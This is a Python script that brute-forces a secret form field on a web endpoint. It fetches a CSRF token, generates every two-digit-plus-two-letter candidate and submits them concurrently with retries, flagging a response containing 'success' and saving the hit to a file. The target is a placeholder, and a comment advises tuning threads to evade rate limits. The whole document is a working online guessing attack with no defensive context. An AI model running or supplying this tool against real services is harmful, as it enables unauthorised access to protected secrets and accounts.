import requests
import concurrent.futures
import itertools
import string
import time
import re

URL        = "https://your-target-url/endpoint/"   # Target endpoint
STATIC_KEY = "your_static_field_name"              # Form field with a known, fixed value
STATIC_VAL = "your_static_value"                   # Value for the static field
FUZZ_FIELD = "secret"                              # Form field to brute-force
OUTPUT_FILE = "result.txt"                         # Where to save a successful hit
MAX_WORKERS = 5                                    # Concurrent threads (tune to avoid rate limits)


digits  = [f"{i:02d}" for i in range(100)]
letters = ["".join(p) for p in itertools.product(string.ascii_lowercase, repeat=2)]
all_secrets = [d + l for d in digits for l in letters]
session = requests.Session()
r = session.get(URL, timeout=10)

# Extract CSRF token from the rendered HTML form
match = re.search(r'csrfmiddlewaretoken" value="(.+?)"', r.text)
csrf = match.group(1) if match else None
print(f"CSRF token: {'found' if csrf else 'not found'}")
count = 0
start = time.time()
total = len(all_secrets)
def try_secret(secret):
    """Submit one candidate. Returns the secret on success, None otherwise."""
    global count

    for attempt in range(3):   # Retry up to 3 times on transient errors
        try:
            data = {
                STATIC_KEY:             STATIC_VAL,
                FUZZ_FIELD:             secret,
                "csrfmiddlewaretoken":  csrf,
            }
            response = session.post(URL, data=data, timeout=10)
            count += 1

            # Progress report every 200 requests
            if count % 200 == 0:
                elapsed   = time.time() - start
                rate      = count / elapsed
                remaining = (total - count) / rate
                print(f"  {count}/{total} | {rate:.0f} req/s | ~{remaining:.0f}s left")

            if "success" in response.text.lower():
                return secret

            return None

        except Exception:
            time.sleep(1)   # Back off briefly on network errors

    return None

print(f"Starting fuzzer — {total} candidates, {MAX_WORKERS} workers\n")

with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
    for result in executor.map(try_secret, all_secrets):
        if result:
            print(f"\n✓ FOUND: {FUZZ_FIELD} = {result}")
            with open(OUTPUT_FILE, "w") as f:
                f.write(f"{STATIC_KEY}: {STATIC_VAL}\n{FUZZ_FIELD}: {result}\n")
            print(f"  Saved to {OUTPUT_FILE}")
            break

print("\nDone.")
